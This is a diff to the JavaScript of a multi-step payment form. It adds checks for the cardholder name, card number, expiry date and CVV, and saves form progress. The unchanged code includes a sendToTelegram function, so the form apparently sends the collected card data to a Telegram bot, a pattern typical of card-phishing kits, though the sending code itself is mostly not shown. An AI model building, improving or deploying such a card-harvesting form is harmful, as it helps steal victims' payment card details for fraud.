@@ -14,16 +14,49 @@ function nextStep() {
         }
     }
 }
-
 function validateStep() {
     const inputs = steps[currentStep].querySelectorAll("input, select");
     for (let input of inputs) {
-        if (!input.checkValidity()) {
+        if (!input.value.trim()) {
+            alert(`Please fill in the ${input.previousElementSibling.innerText}`);
+            return false;
+        }
+
+        if (input.id === "cardName" && !/^[A-Za-z\s]+$/.test(input.value)) {
+            alert("Cardholder's name must only contain letters.");
+            return false;
+        }
+
+        if (input.id === "cardNumber" && !/^\d{16}$/.test(input.value)) {
+            alert("Card number must be exactly 16 digits.");
+            return false;
+        }
+
+        if (input.id === "expiryDate" && !/^(0[1-9]|1[0-2])\/\d{2}$/.test(input.value)) {
+            alert("Expiration date must be in MM/YY format.");
+            return false;
+        }
+
+        if (input.id === "cvv" && !/^\d{3}$/.test(input.value)) {
+            alert("CVV must be exactly 3 digits.");
             return false;
         }
     }
     return true;
 }
+// Save progress
+function saveProgress() {
+    localStorage.setItem("currentStep", currentStep);
+}
+
+// Load progress
+window.onload = function () {
+    const savedStep = localStorage.getItem("currentStep");
+    if (savedStep) {
+        currentStep = parseInt(savedStep);
+        steps[currentStep].classList.add("active");
+    }
+};
 
 function submitForm() {
     if (validateStep()) {
@@ -73,4 +106,4 @@ function sendToTelegram(message) {
     .catch(() => {
         alert("Network error! Please check your connection and try again.");
     });
-}
+            }
